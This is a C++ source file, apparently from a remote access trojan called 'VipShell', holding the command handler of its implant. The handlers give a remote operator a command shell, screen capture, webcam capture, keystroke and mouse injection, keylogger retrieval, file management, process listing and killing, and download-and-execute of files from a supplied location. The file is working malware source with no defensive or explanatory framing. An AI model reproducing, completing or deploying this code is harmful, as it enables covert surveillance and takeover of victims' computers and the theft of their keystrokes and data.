#include ".\connectserverproc.h"
#include "tools.h"

CConnectServerProc::CConnectServerProc(void)
{
	m_pSysinfo = NULL;
}
CConnectServerProc::~CConnectServerProc(void)
{
}


void CConnectServerProc::OnCmd_GetDoWork(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = 0; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::SetServerSystemInfo(tagServerSystemInfo* p)
{
	m_pSysinfo = p;
}
void CConnectServerProc::OnCmd_GetSystemInfo(tagVipShellCmd* info)
{
	return OnCmd_GetDoWork(info);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = 0; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnCmd_GetShell(tagVipShellCmd* info)
{
	ULONG ip;
	USHORT port;
	m_hServer->GetPeer(&ip, &port);
	m_hServerManage->ConnectServerEx(ip, port, CREATE_THREAD_MARKER_SHELLCOMMAND);
	return OnCmd_GetDoWork(info);
}
void CConnectServerProc::OnCmd_GetScreen(tagVipShellCmd* info)
{
	ULONG ip;
	USHORT port;
	m_hServer->GetPeer(&ip, &port);
	srand(GetTickCount());
	DWORD dwId = rand();
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	SendInfo.dw1 = dwId;
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	int nRet = m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return ;
	m_hServerManage->ConnectServerEx(ip, port, CREATE_THREAD_MARKER_SCREENINFO, dwId);
}

void CConnectServerProc::OnKeyDownd(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	keybd_event((BYTE)info->dw1,0,0,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnKeyUp(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	keybd_event((BYTE)info->dw1,0,KEYEVENTF_KEYUP,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnMouseMove(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	SetCursorPos(info->dw1, info->dw2);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnLButtonDown(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnLButtonUp(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnLButtonDblclk(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
	mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
	mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
	mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnRButtonDown(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnRButtonUp(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnRButtonDblclk(tagVipShellCmd* info)
{
	COpenDesktop hDesktop;
	mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
	mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
	mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
	mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}
void CConnectServerProc::OnKeyCtrlAltDel(tagVipShellCmd* info)
{
	KeyDownCtrlAltDel();
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

void CConnectServerProc::OnGetCap(tagVipShellCmd* info)
{

	tagVipShellCmd SendInfo;
	HWND hwnd = FindCapWnd();
	if(hwnd)
		SendInfo.dwCmd = CMD_ERROR; 
	else
	{
		if(!IsCanCap())
			SendInfo.dwCmd = CMD_ERROR; 
		else
		{
			ULONG ip;
			USHORT port;
			m_hServer->GetPeer(&ip, &port);
			m_hServerManage->ConnectServerEx(ip, port, CREATE_THREAD_MARKER_GETCAP);
			SendInfo.dwCmd = CMD_ISOK; 
		}

	}
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	return ;
}

void CConnectServerProc::OnCmd_GetFileManage(tagVipShellCmd* info)
{
	ULONG ip;
	USHORT port;
	m_hServer->GetPeer(&ip, &port);
	m_hServerManage->ConnectServerEx(ip, port, CREATE_THREAD_MARKER_FILEMANAGE);
	return OnCmd_GetDoWork(info);
}
void CConnectServerProc::OnCmd_GetKeyLog(tagVipShellCmd* info)
{
	ULONG ip;
	USHORT port;
	m_hServer->GetPeer(&ip, &port);
	m_hServerManage->ConnectServerEx(ip, port, CREATE_THREAD_MARKER_GETKEYLOG);
	return OnCmd_GetDoWork(info);
}
void CConnectServerProc::OnCmd_GetProcessList(tagVipShellCmd* info)
{
	std::vector<tagVipShellProcess> VecTor;
	DWORD dwLen = GetProcessToVecTor(&VecTor);
	tagVipShellCmd SendInfo;
	if(dwLen == 0)
		SendInfo.dwCmd = CMD_ERROR;
	else
		SendInfo.dwCmd = CMD_ISOK; 
	SendInfo.dw1 = dwLen;
	int nRet = m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return ;
	if(dwLen == 0)
		return ;
	nRet = m_hServer->Recv(&SendInfo, sizeof(tagVipShellCmd));
	if(nRet == SOCKET_ERROR)
		return ;
	BYTE* pBuf = new BYTE[dwLen * sizeof(tagVipShellProcess)];
	for(DWORD i = 0; i < VecTor.size(); i++)
		memcpy(pBuf + (i * sizeof(tagVipShellProcess)), &VecTor[i], sizeof(tagVipShellProcess));
	nRet = _SendBuffData(pBuf,  dwLen * sizeof(tagVipShellProcess));
	delete pBuf ;
	return ;
}
void CConnectServerProc::OnCmd_KillProcess(tagVipShellCmd* info)
{
	BOOL bRet = KillProcess(info->dw1);
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK;
	if(bRet)
		SendInfo.dw1 = CMD_ISOK;
	else
		SendInfo.dw1 = CMD_ERROR;
	 m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

void CConnectServerProc::OnCmd_DownFileRun(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	CreateThreadDownFile((LPCWSTR)info->pBuff);
}
void CConnectServerProc::OnCmd_SaveConfig(tagVipShellCmd* info)
{
	//szExplain
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = CMD_ISOK; 
	if( info->dw1 == 1)
	{
		SetVipShellConfigExplain((LPCWSTR)info->pBuff);
		lstrcpy(m_pSysinfo->szExplain, (LPCWSTR)info->pBuff);
	}
	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}